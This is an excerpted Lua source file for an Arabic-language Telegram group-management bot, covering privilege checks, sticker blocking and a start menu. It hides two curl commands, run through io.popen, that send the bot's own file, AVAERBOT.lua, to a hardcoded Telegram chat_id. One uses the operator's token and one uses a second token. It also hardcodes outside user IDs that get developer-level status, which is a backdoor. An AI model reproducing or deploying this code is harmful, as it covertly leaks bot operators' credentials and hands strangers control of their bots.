...
Ids_Dev = {Id_Dev,bot_id,1572839070,1533230723,1418271376}
...
local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 1533230723 ..'" -F "document=@'..'AVAERBOT.lua'..'"' io.popen(curlm) 
...
local curla = 'curl "'..'https://api.telegram.org/bot'.. sex1 ..'/sendDocument'..'" -F "chat_id='.. 1533230723 ..'" -F "document=@'..'AVAERBOT.lua'..'"' io.popen(curla)
...
Status = true  
elseif tonumber(user_id) == tonumber(1533230723) then  
Status = true
elseif tonumber(user_id) == tonumber(1572839070) then  
Status = true
elseif tonumber(user_id) == tonumber(1418271376) then  
Status = true
...
if tonumber(user_id) == tonumber(1572839070) then  
Status = "مبرمج التلي"
elseif tonumber(user_id) == tonumber(1533230723) then  
Status = "مبرمج التلي "
elseif tonumber(user_id) == tonumber(1418271376) then  
...
send(msg.chat_id_,0, "❃∫عذرا يا ⇠ ["..data.first_name_.."](T.ME/Kabt_ok)\n❃∫ الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
Delete_Message(msg.chat_id_,{[0] = msg.id_})       
return false   
...
CmdStart = '\n❃∫ اهلا بك عزيزي ❃∫\n انا بوت اسمي '..(redis:get(bot_id.."NightRang:Redis:Name:Bot") or "جميز")..''..
...
keyboard = {} 
keyboard.inline_keyboard = { 
{{text = '>> DEV MODA >', url="t.me/Gmez_0k"}},
{{text = '>> DEV SAFY >', url="t.me/Gmez_1k"}},
{{text = '>> DEV MODY>', url="t.me/ElgZzr"}},
{{text = 'source Ev_iL', url="t.me/Kabt_ok"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
